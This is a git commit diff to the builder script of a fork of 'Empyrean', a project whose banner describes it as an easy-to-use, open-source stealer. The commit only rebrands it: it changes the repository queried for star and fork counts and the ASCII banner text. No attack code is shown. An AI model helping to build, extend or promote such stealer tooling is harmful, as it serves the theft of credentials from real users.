dacba1ce6a138c2d78bde74cef9749092f599983
LiamGoBrrr <liammegabloxyuh@gmail.com>
2025-03-19 00:17:30 -0400

    Update main.py

--- builder/main.py
+++ builder/main.py
@@ -15,9 +15,9 @@ from util.writeconfig import WriteConfig
 
 def main():
     stars = requests.get(
-        f"https://api.github.com/repos/addi00000/empyrean").json()["stargazers_count"]
+        f"https://api.github.com/repos/LiamGoBrrr/Empyrean-V2").json()["stargazers_count"]
     forks = requests.get(
-        f"https://api.github.com/repos/addi00000/empyrean").json()["forks_count"]
+        f"https://api.github.com/repos/LiamGoBrrr/Empyrean-V2").json()["forks_count"]
 
     logging.basicConfig(
         level="NOTSET",
@@ -30,7 +30,7 @@ def main():
     logging.getLogger("rich")
     console = Console()
 
-    console.print(pyfiglet.figlet_format("empyrean", font="graffiti"),
+    console.print(pyfiglet.figlet_format("Empyrean X", font="Elite"),
                   justify="center", highlight=False, style="magenta", overflow="ignore")
     console.print(f"Easy to use and open-source stealer.\nStars: {stars} | Forks: {forks}",
                   justify="center", highlight=False, style="bold magenta", overflow="ignore")
